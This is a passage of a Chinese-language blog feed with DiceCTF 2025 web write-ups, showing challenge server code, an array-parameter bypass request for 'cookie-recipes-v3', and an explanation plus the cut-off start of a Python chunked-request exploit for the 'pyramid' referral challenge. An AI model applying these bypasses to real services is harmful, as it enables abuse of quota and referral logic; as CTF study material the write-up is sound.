long_to_bytes(alpha)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[(541847931463604073209188621415697353813245102261880389530448, 293760933113243563398917466885108625646262447370201484418246), (235213326900086489464935804156966465366154623411555613791270, 660823982268225103178763707015491421784294988488272636270997), (826464884761457937459245903152143755707241416981488127320435, 428521663319038461250005113612781686761766888058391496085911), (589542000504317435156560078533519448295689695687499354390208, 155284353896000150766154807679279597476176668344402166959399), (968823371588600973965757332601758200815345862153455338808286, 870008943690791009196027169525956126827736285614393106689402), (621636099728440147413990266662022925118216803638588918660041, 265635912066749696542909843111997941904342442664219734956888), (426696569424050102229606043215592727790577655338668728275370, 279313121876980354011480010042682666651614765507190502627689), (89450479064580125731654556963306718472532905610952012502649, 465933125964565419295325650759566635253450915499965633327941), (480355476500393865742379469913983270769356894135485925662119, 894041172171871806404285309781862268351135623868845025443422), (842436524669577199024236805258573090764419350786291073287889, 345478552143958037534551648319293899442551000874041707820740), (650054674429185550652935714084022116516082323269321462104664, 441999979283903658157822753439653947343822546158589507765994), (46289431385578693366971976442426853079852982529357847290686, 625618376463384339878849844467050454204685252824782609369180), (71444185449163133531919043374545893927347050624346741281881, 955925578289311966288639224625142299309823207245807788495453), (192579726169321656812883068526498248523814846320328766176253, 626481822474054336470183912297952839011392733501646931370367), (736527635648804640774976580747540045854351230084566721853611, 276626211757586963928788091386096607703513204646314683038338), (177922521867185878959621840269164617147915792720210315529733, 541058782621716573816245900423919799500476442285991532228641), (40610451174818168154306630612571678739921107216052349044576, 727642592899858828601137105077611015328512898368636299587376), (385012983728389322601149562441674995471397288632464238356283, 353921151307105661267278594470212933060655245893209524497156), (750447975601038834764379841158092390933760641866111445401426, 391626416964965737035878375834907580903143512300198923948189), (115058604943298010958881205548782439407592353731185670266593, 491630592857258949793489206081490523001249620510479961058022), (327389234395954477946639629629085910688793716425320663599360, 24975272330009592102362429346350824580378490147041708568130), (115595274689129534885608766476695918464309130165432995990883, 757961876891952019297626599379744405302595090402128271144165), (950804723308776351161744501221236453742418549093165078282534, 20307246759635231945223392614290397512873344480184942904518), (724537610412063699714461780160573528810830178440136810747811, 149681928388378582933943374524511804362928290938917573644613), (340891278018589324130004945217960336392205386747747011263373, 683307718413135477104477081812052183267507312278283317237187), (104379682905784169840335131193505192063050242530811180817410, 715010230598797717533306270232399781090458356371977748416491), (644160326926600986730919713173510327120201404569141824224075, 127877985489410167008195578625004740882394608402141169695352), (549253388716005399852261816416312267100135940382820676807345, 210560134643237517255193955173709174155305784935427470113433), (968265711632086435506163736279856957220961064226797549228006, 273174723915971720522674140326199419265943707917542063022561), (704367622558261900937184683100177434487519780290678439135652, 959106497548134540301589019840013331842784496835379005298630)]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)&lt;/p&gt;
&lt;h1 id=&quot;kalmarctf2025-basic-sums&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#kalmarctf2025-basic-sums&quot;&gt;&lt;/a&gt; Ka</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DiceCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/31/DiceCTF2025-WriteUp/</id>
    <published>2025-03-30T17:38:57.000Z</published>
    <updated>2025-04-01T19:11:05.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="cookie-recipes-v3"><a class="markdownIt-Anchor" href="#cookie-recipes-v3"></a> cookie-recipes-v3</h2><blockquote><p>Mmmmmmm…</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.<span class="property">headers</span>.<span class="property">cookie</span></span><br><span class="line">    <span class="keyword">const</span> user = cookies?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123; req.<span class="property">user</span> = user &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> id = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">slice</span>(<span class="number">2</span>)</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`user=<span class="subst">$&#123;id&#125;</span>`</span>)</span><br><span class="line">        req.<span class="property">user</span> = id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.xz.style/serve/inter.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;You have &lt;span&gt;<span class="subst">$&#123;count&#125;</span>&lt;/span&gt; cookies&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;basic&quot;&gt;Basic cookie recipe (makes one)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;advanced&quot;&gt;Advanced cookie recipe (makes a dozen)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button disabled&gt;Super cookie recipe (makes a million)&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;button id=&quot;deliver&quot;&gt;Deliver cookies&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/script.js&#x27;</span>, <span class="function">(<span class="params">_req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;js&#x27;</span>).<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        const basic = document.querySelector(&#x27;#basic&#x27;)</span></span><br><span class="line"><span class="string">        const advanced = document.querySelector(&#x27;#advanced&#x27;)</span></span><br><span class="line"><span class="string">        const deliver = document.querySelector(&#x27;#deliver&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        const showCookies = (number) =&gt; &#123;</span></span><br><span class="line"><span class="string">            const span = document.querySelector(&#x27;span&#x27;)</span></span><br><span class="line"><span class="string">            span.textContent = number</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        basic.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=1&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        advanced.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/bake?number=12&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const number = await res.text()</span></span><br><span class="line"><span class="string">            showCookies(+number)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        deliver.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span></span><br><span class="line"><span class="string">            const res = await fetch(&#x27;/deliver&#x27;, &#123; method: &#x27;POST&#x27; &#125;)</span></span><br><span class="line"><span class="string">            const text = await res.text()</span></span><br><span class="line"><span class="string">            alert(text)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/deliver&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> current = cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> target = <span class="number">1_000_000_000</span></span><br><span class="line">    <span class="keyword">if</span> (current &lt; target) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`not enough (need <span class="subst">$&#123;target - current&#125;</span>) more`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>点击量需要十亿次</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/bake&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = req.<span class="property">query</span>.<span class="property">number</span></span><br><span class="line">    <span class="keyword">if</span> (!number) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;missing number&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number.<span class="property">length</span> &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        cookies.<span class="title function_">set</span>(req.<span class="property">user</span>, (cookies.<span class="title function_">get</span>(req.<span class="property">user</span>) ?? <span class="number">0</span>) + <span class="title class_">Number</span>(number))</span><br><span class="line">        res.<span class="title function_">end</span>(cookies.<span class="title function_">get</span>(req.<span class="property">user</span>).<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;that is too many cookies&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>限制了我们传入的数字字符串<code>number</code>长度<code>小于等于2</code>，这里可以用<strong>数组绕过</strong>，从而检验的是<strong>数组的长度</strong>，而不是<strong>字符串长度</strong><br /><code>POST /bake?number[]=99999999999999</code></p><h2 id="pyramid复现学习"><a class="markdownIt-Anchor" href="#pyramid复现学习"></a> pyramid(复现学习)</h2><blockquote><p>Would you like to buy some supplements?</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;link</span></span><br><span class="line"><span class="string">        rel=&quot;stylesheet&quot;</span></span><br><span class="line"><span class="string">        href=&quot;https://unpkg.com/axist@latest/dist/axist.min.css&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> codes = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">random</span> = (<span class="params"></span>) =&gt; crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">referrer</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (code &amp;&amp; codes.<span class="title function_">has</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">const</span> token = codes.<span class="title function_">get</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">headers</span>.<span class="property">cookie</span>?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        req.<span class="property">token</span> = token</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            req.<span class="property">user</span> = users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Account: <span class="subst">$&#123;<span class="built_in">escape</span>(req.user.name)&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            You have &lt;strong&gt;<span class="subst">$&#123;req.user.bal&#125;</span>&lt;/strong&gt; coins.</span></span><br><span class="line"><span class="string">            You have referred &lt;strong&gt;<span class="subst">$&#123;req.user.ref&#125;</span>&lt;/strong&gt; users.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/code&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Generate referral code&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/cashout&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">                    Cashout <span class="subst">$&#123;req.user.ref&#125;</span> referrals</span></span><br><span class="line"><span class="string">                &lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/buy&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Purchase flag&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Register&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/new&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;name&quot; type=&quot;text&quot; placeholder=&quot;Name&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input</span></span><br><span class="line"><span class="string">                    name=&quot;refer&quot;</span></span><br><span class="line"><span class="string">                    type=&quot;text&quot;</span></span><br><span class="line"><span class="string">                    placeholder=&quot;Referral code (optional)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Register&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="title function_">random</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> body = []</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">bind</span>(body))</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(body).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(data)</span><br><span class="line">        <span class="keyword">const</span> name = parsed.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)?.<span class="title function_">toString</span>() ?? <span class="string">&#x27;JD&#x27;</span></span><br><span class="line">        <span class="keyword">const</span> code = parsed.<span class="title function_">get</span>(<span class="string">&#x27;refer&#x27;</span>) ?? <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// referrer receives the referral</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123; r.<span class="property">ref</span> += <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line">        users.<span class="title function_">set</span>(token, &#123;</span><br><span class="line">            name,</span><br><span class="line">            code,</span><br><span class="line">            <span class="attr">ref</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">bal</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`token=<span class="subst">$&#123;token&#125;</span>`</span>)</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">token</span></span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = <span class="title function_">random</span>()</span><br><span class="line">        codes.<span class="title function_">set</span>(code, token)</span><br><span class="line">        res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Referral code generated&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Your code: &lt;strong&gt;<span class="subst">$&#123;code&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// referrals translate 1:1 to coins</span></span><br><span class="line"><span class="comment">// you receive half of your referrals as coins</span></span><br><span class="line"><span class="comment">// your referrer receives the other half as kickback</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// if your referrer is null, you can turn all referrals into coins</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/cashout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> u = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(u.<span class="property">code</span>)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, r.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, r.<span class="property">ref</span> + u.<span class="property">ref</span> / <span class="number">2</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span> / <span class="number">2</span>]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">bal</span> &gt; <span class="number">100_000_000_000</span>) &#123;</span><br><span class="line">            user.<span class="property">bal</span> -= <span class="number">100_000_000_000</span></span><br><span class="line">            res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">                &lt;h1&gt;Successful purchase&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            `</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">        &lt;h1&gt;Not enough coins&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>太好玩了，简直无懈可击，不是吗？（潘队：还是太安全了；放弃了，我需要马上玩游戏）</p><p>用户不使用推荐码进行注册，那么拉到的人头都是自己的；而使用推荐码注册，拉到的人头要跟上级对半分</p><p>emmm，感觉是可以通过<strong>自荐</strong>来获得1.5的<strong>指数爆炸</strong>效果，如果可以的话，应该发送63个数据包这样就可以实现。我测试过自荐，但很可惜，它不是在原有基础上再进行1.5指数倍增长，而是一部分一部分的转化，是加算，并且，通过发包发现，并不能实现1.5倍的转化，拿到多少是多少，意思就是没能实现自荐。。。</p><p>总不能我<code>yakit</code>多线程发包发到一千亿吧()</p><p>这题就像一个倒立的金字塔，越下面的人收获就越少……</p><p>赛后，要了<code>V&amp;N</code>一位师傅的<code>exp</code>，钻研之后，接着又去<code>discord</code>找<code>wp</code>，均进行了小改，以下脚本全部实现了自动化</p><p>首先，说一下<strong>实现自荐</strong>的思路：其实是因为<code>/new</code>路径下的<code>req.on('data') req.on('end')</code>，这里导致了可以实现<strong>分块传输</strong>，然后我们第一个块先<code>new</code>，获取到<code>token</code>(读完<code>请求body</code>就可以拿到<code>token</code>)，接着<code>Python发包</code>获取到<code>code</code>，第二个块就自荐注册，然后<strong>关闭进程</strong>，注意此过程<code>token</code>是一直要有的，最后要用一下推荐码才能有最开始的1.5，然后进行转换<strong>63次</strong>即可(1.5^63=1240亿)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRef</span>(<span class="params">code</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/new&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;refer&quot;</span>: code</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 建立HTTPS连接</span></span><br><span class="line">    host = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">    port = <span class="number">443</span>  <span class="comment"># HTTPS默认端口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建SSL上下文</span></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建普通socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 包装为SSL socket</span></span><br><span class="line">    ssl_sock = context.wrap_socket(s, server_hostname=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到服务器</span></span><br><span class="line">    ssl_sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造分块请求头</span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;POST /new HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: &#123;host&#125;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    ).<span class="built_in">format</span>(host=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求头</span></span><br><span class="line">    ssl_sock.send(request.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收服务器响应头（包含Set-Cookie）</span></span><br><span class="line">    response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span 